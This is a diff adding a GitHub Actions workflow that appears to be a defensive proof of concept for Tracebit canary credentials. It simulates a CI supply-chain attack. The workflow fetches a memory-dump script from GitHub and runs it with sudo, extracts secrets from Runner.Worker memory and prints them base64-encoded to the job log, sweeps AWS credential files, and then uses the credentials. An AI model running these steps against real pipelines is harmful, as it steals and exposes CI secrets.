@@ -1,0 +1,130 @@
+# .github/workflows/canary-memdump-poc.yaml
+#
+# PURPOSE: Demonstrate that Tracebit canary credentials planted in a CI/CD
+# pipeline are discoverable by the same memory-dump technique used in
+# real supply-chain attacks (tj-actions/changed-files, Cacheract, KICS).
+#
+# This simulates what an attacker would see — proving that canary creds
+# act as tripwires. Any attempt to USE the dumped credentials will
+# trigger a Tracebit alert.
+#
+# ⚠️  Run this ONLY in a test/sandbox repository.
+# ⚠️  The workflow prints base64-encoded blobs to the log for inspection.
+#     In a real attack, these would be exfiltrated to a C2 server.
+
+name: "PoC: Canary Credential Memory Dump"
+
+on:
+  workflow_dispatch: # Manual trigger only
+
+permissions:
+  contents: read
+
+jobs:
+  canary-memdump-test:
+    runs-on: ubuntu-latest
+
+    steps:
+      # ---------------------------------------------------------------
+      # Step 1: Check out the repo (contains the Tracebit action)
+      # ---------------------------------------------------------------
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # ---------------------------------------------------------------
+      # Step 2: Issue Tracebit canary credentials
+      # These are decoy AWS creds that Tracebit monitors.
+      # The action writes them to an AWS profile, env vars,
+      # and passes them through GITHUB_OUTPUT — all of which
+      # end up in Runner.Worker process memory.
+      # ---------------------------------------------------------------
+      - name: Issue Tracebit canary credentials
+        id: issue-credentials
+        uses: ./.github/actions/issue-credentials
+        with:
+          tracebit-api-token: ${{ secrets.TRACEBIT_API_TOKEN }}
+
+      # ---------------------------------------------------------------
+      # Step 3: Simulate the attack — dump Runner.Worker memory
+      # This is the same technique from:
+      #   - tj-actions/changed-files compromise (Mar 2025)
+      #   - Cacheract cache-poisoning malware (Dec 2024)
+      #   - KICS/TeamPCP supply-chain attack (Mar 2026)
+      #
+      # The memdump.py script reads /proc/<pid>/mem of the
+      # Runner.Worker process and outputs all readable regions.
+      # We then grep for the secret pattern GitHub uses internally.
+      # ---------------------------------------------------------------
+      - name: "Simulate attack: dump Runner.Worker memory"
+        run: |
+          echo "=== Simulating attacker memory dump ==="
+          echo "Searching for secrets in Runner.Worker process memory..."
+
+          # Download and run the memdump script (same as used in real attacks)
+          # Then search for the GitHub Actions secret storage pattern:
+          #   {"value":"<secret>","isSecret":true}
+          B64_BLOB=$(
+            curl -sSf \
+              https://raw.githubusercontent.com/AdnaneKhan/Cacheract/refs/heads/main/assets/memdump.py \
+            | sudo python3 \
+            | tr -d '\0' \
+            | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' \
+            | sort -u \
+            | base64 -w 0
+          )
+
+          echo ""
+          echo "=== Secrets found in memory (base64-encoded) ==="
+          echo "$B64_BLOB"
+          echo ""
+          echo "=== Decoded secret names (values redacted) ==="
+          echo "$B64_BLOB" | base64 -d | grep -oP '"[^"]+"(?=:\{)' | sort -u
+
+      # ---------------------------------------------------------------
+      # Step 4: Also check the filesystem for canary creds
+      # Real malware (Cacheract, KICS) sweeps the filesystem too.
+      # The Tracebit action writes an AWS profile, so the creds
+      # will be in ~/.aws/credentials.
+      # ---------------------------------------------------------------
+      - name: "Simulate attack: sweep filesystem for credentials"
+        run: |
+          echo "=== Simulating attacker filesystem sweep ==="
+
+          echo ""
+          echo "--- Checking AWS credential files ---"
+          for f in ~/.aws/credentials ~/.aws/config; do
+            if [ -f "$f" ]; then
+              echo "Found: $f"
+              echo "(File exists and contains credential data)"
+            fi
+          done
+
+          echo ""
+          echo "--- Checking environment for AWS-like variables ---"
+          env | grep -iE '(AWS|__AWS__)' | sed 's/=.*/=<REDACTED>/' || true
+
+          echo ""
+          echo "--- Checking GITHUB_OUTPUT for leaked step outputs ---"
+          if [ -f "$GITHUB_OUTPUT" ]; then
+            echo "Found GITHUB_OUTPUT file"
+            grep -c 'aws-' "$GITHUB_OUTPUT" && \
+              echo "AWS credential references found in step outputs" || true
+          fi
+
+      # ---------------------------------------------------------------
+      # Step 5: Verify the canary creds are valid (attacker would do this)
+      # This call WILL trigger a Tracebit alert! That's the whole point.
+      # In a real scenario, the attacker calls sts:GetCallerIdentity
+      # or enumerates S3 buckets — Tracebit catches it immediately.
+      # ---------------------------------------------------------------
+      - name: "Verify: use canary creds (triggers Tracebit alert!)"
+        run: |
+          echo "=== Using canary credentials ==="
+          echo "An attacker would now try to use these stolen creds."
+          echo "This WILL trigger a Tracebit alert."
+          echo ""
+
+          # Use the profile that the Tracebit action created
+          aws sts get-caller-identity \
+            --profile ${{ steps.issue-credentials.outputs.profile-name }} \
+            2>&1 || echo "(Expected: this call is monitored by Tracebit)"
